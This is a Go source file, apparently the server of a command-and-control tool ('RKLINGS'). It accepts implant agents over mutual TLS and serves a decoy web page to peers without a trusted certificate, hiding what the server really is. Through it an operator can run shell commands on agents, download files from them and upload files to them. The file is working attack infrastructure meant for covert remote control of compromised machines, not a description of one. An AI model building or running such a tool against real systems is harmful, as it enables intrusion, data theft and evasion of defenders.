package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

//go:embed decoy.html
var decoyHTML string

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "usage: %s <cert> <key> <ca>\n", os.Args[0])
		os.Exit(1)
	}

	addr := os.Getenv("RKLINGS_LISTEN_ADDR")
	if addr == "" {
		addr = ":8443"
	}
	ln, agentRoots := listen(addr, os.Args[1], os.Args[2], os.Args[3])
	defer ln.Close()

	go startWeb()
	tuiEnabled := os.Getenv("RKLINGS_NO_TUI") != "1"
	if tuiEnabled {
		go startTUI(ln)
	}

	webAddr := os.Getenv("RKLINGS_WEB_ADDR")
	if webAddr == "" {
		webAddr = "127.0.0.1:8080"
	}
	if !tuiEnabled {
		fmt.Printf("[*] Agent mTLS on %s\n", addr)
		fmt.Printf("[*] Dashboard on http://%s\n", webAddr)
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			if tuiEnabled {
				return
			}
			log.Printf("accept: %v", err)
			continue
		}

		tlsConn := conn.(*tls.Conn)
		if err := tlsConn.Handshake(); err != nil {
			if os.Getenv("RKLINGS_DEBUG") == "1" {
				log.Printf("rejected TLS peer %s: %v", conn.RemoteAddr(), err)
			}
			_ = conn.Close()
			continue
		}

		state := tlsConn.ConnectionState()
		reader := bufio.NewReader(conn)
		if !trustedAgent(state, agentRoots) {
			serveDecoy(conn, reader)
			continue
		}

		_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		hello, err := reader.ReadString('\n')
		_ = conn.SetReadDeadline(time.Time{})
		if err != nil || !strings.HasPrefix(hello, "HELLO ") {
			_ = conn.Close()
			continue
		}
		agentID := strings.TrimSpace(strings.TrimPrefix(hello, "HELLO "))
		if agentID == "" || len(agentID) > 128 {
			_ = conn.Close()
			continue
		}
		agents.add(agentID, conn, reader)
		if tuiEnabled {
			notifyTUI("Agent connected: " + agentID)
		} else {
			fmt.Printf("[+] Agent connected: %s\n", agentID)
		}
		recordEvent("connect", "agent connected: "+agentID)

	}
}

func listen(addr, certFile, keyFile, caFile string) (net.Listener, *x509.CertPool) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		log.Fatalf("load server cert: %v", err)
	}

	caCert, err := os.ReadFile(caFile)
	if err != nil {
		log.Fatalf("read CA cert: %v", err)
	}

	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caCert) {
		log.Fatal("failed to parse CA cert")
	}

	ln, err := tls.Listen("tcp", addr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientCAs:    pool,
		ClientAuth:   tls.RequestClientCert,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("listen: %v", err)
	}
	return ln, pool
}

func trustedAgent(state tls.ConnectionState, roots *x509.CertPool) bool {
	if len(state.PeerCertificates) == 0 {
		return false
	}
	intermediates := x509.NewCertPool()
	for _, cert := range state.PeerCertificates[1:] {
		intermediates.AddCert(cert)
	}
	_, err := state.PeerCertificates[0].Verify(x509.VerifyOptions{
		Roots: roots, Intermediates: intermediates,
		KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
	})
	return err == nil
}

func serveDecoy(conn net.Conn, reader *bufio.Reader) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	request, err := http.ReadRequest(reader)
	if err != nil {
		return
	}
	_ = request.Body.Close()
	body := decoyHTML
	response := &http.Response{
		StatusCode: http.StatusOK, Status: "200 OK", ProtoMajor: 1, ProtoMinor: 1,
		Header: make(http.Header), Body: io.NopCloser(strings.NewReader(body)),
		ContentLength: int64(len(body)), Close: true,
	}
	response.Header.Set("Content-Type", "text/html; charset=utf-8")
	response.Header.Set("Cache-Control", "no-store")
	response.Header.Set("Content-Security-Policy",
		"default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'")
	response.Header.Set("X-Content-Type-Options", "nosniff")
	_ = response.Write(conn)
}

func sendToAgent(cmd string) (string, error) {
	session, err := agents.current()
	if err != nil {
		return "", err
	}
	return sendToSession(session, cmd)
}

func sendToAgentID(id, cmd string) (string, error) {
	session, err := agents.get(id)
	if err != nil {
		return "", err
	}
	return sendToSession(session, cmd)
}

func sendToSession(session *agentSession, cmd string) (string, error) {
	session.io.Lock()
	defer session.io.Unlock()
	conn, r := session.conn, session.r

	if _, err := fmt.Fprintf(conn, "%s\n", cmd); err != nil {
		setOffline(conn)
		return "", fmt.Errorf("write: %w", err)
	}

	if strings.HasPrefix(cmd, "SHELL ") {
		first, err := r.ReadString('\n')
		if err != nil {
			return "", err
		}
		first = strings.TrimRight(first, "\r\n")
		if strings.HasPrefix(first, "SHELL_RESULT ") {
			return formatShellResult(strings.TrimPrefix(first, "SHELL_RESULT "))
		}
		var lines []string
		if first != "." {
			lines = append(lines, first)
		}
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				return strings.Join(lines, "\n"), err
			}
			line = strings.TrimRight(line, "\r\n")
			if line == "." {
				break
			}
			lines = append(lines, line)
		}
		return strings.Join(lines, "\n"), nil
	}

	if strings.HasPrefix(cmd, "DOWNLOAD ") {
		resp, err := r.ReadString('\n')
		if err != nil {
			return "", fmt.Errorf("no response")
		}
		resp = strings.TrimRight(resp, "\r\n")
		if strings.HasPrefix(resp, "ERR") {
			return resp, nil
		}
		size, err := strconv.ParseInt(resp, 10, 64)
		if err != nil {
			return resp, nil
		}
		buf := make([]byte, size)
		_, err = io.ReadFull(r, buf)
		if err != nil {
			return "", fmt.Errorf("read file: %w", err)
		}
		return string(buf), nil
	}

	resp, err := r.ReadString('\n')
	if err != nil {
		setOffline(conn)
		return "", fmt.Errorf("no response")
	}
	return strings.TrimRight(resp, "\r\n"), nil
}

func formatShellResult(payload string) (string, error) {
	var result struct {
		Stdout   string `json:"stdout"`
		Stderr   string `json:"stderr"`
		ExitCode int    `json:"exit_code"`
	}
	if err := json.Unmarshal([]byte(payload), &result); err != nil {
		return "", fmt.Errorf("decode shell result: %w", err)
	}
	var sections []string
	if result.Stdout != "" {
		sections = append(sections, "stdout:\n"+strings.TrimRight(result.Stdout, "\n"))
	}
	if result.Stderr != "" {
		sections = append(sections, "stderr:\n"+strings.TrimRight(result.Stderr, "\n"))
	}
	sections = append(sections, fmt.Sprintf("exit: %d", result.ExitCode))
	return strings.Join(sections, "\n"), nil
}

func sendUploadToAgent(path string, data []byte) (string, error) {
	session, err := agents.current()
	if err != nil {
		return "", err
	}
	return sendUploadToSession(session, path, data)
}

func sendUploadToAgentID(id, path string, data []byte) (string, error) {
	session, err := agents.get(id)
	if err != nil {
		return "", err
	}
	return sendUploadToSession(session, path, data)
}

func sendUploadToSession(session *agentSession, path string, data []byte) (string, error) {
	session.io.Lock()
	defer session.io.Unlock()
	conn, reader := session.conn, session.r
	if _, err := fmt.Fprintf(conn, "UPLOAD %s\n%d\n", path, len(data)); err != nil {
		setOffline(conn)
		return "", err
	}
	if _, err := conn.Write(data); err != nil {
		setOffline(conn)
		return "", err
	}
	reply, err := reader.ReadString('\n')
	if err != nil {
		setOffline(conn)
		return "", err
	}
	return strings.TrimSpace(reply), nil
}

func setOffline(conn net.Conn) {
	disconnected := agents.remove(conn)
	if disconnected != "" {
		recordEvent("disconnect", "agent disconnected: "+disconnected)
		notifyTUI("Agent disconnected: " + disconnected)
	}
}
